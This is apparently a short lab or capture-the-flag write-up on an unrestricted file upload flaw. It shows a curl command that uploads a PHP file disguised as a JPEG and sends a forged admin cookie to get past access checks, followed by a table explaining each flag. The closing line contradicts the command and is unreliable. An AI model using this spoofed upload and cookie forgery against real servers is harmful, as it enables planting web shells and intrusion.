## 🎯 Vulnerability: Unrestricted File Upload

This vulnerability occurs when a web application allows users to upload files without properly validating their type or content. In this case, the server only checks the file extension or the `Content-Type` header, allowing us to upload a file that looks like an image but actually contains PHP code.

### 🛠 What We Did

We used the following `curl` command to upload a malicious PHP file while pretending it is an image:

```bash
curl -X POST http://{IP_ADDRESS}/?page=upload \
  -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
  -F "uploaded=@shell.php;type=image/jpeg" \
  -F "Upload=Upload"
```

### Option	Description
```
-X  POST	Sends a POST request, which is typically used for form submissions.
-H	Adds a custom HTTP header. We use it to send an admin cookie (I_am_admin) to bypass access restrictions.
-F	Sends form data as multipart/form-data. We attach the file and spoof the MIME type as image/jpeg.
    Upload=Upload	Mimics the submit button name; required by some forms to process the upload.
```

There is no need to add cookies or shell code for this scenario.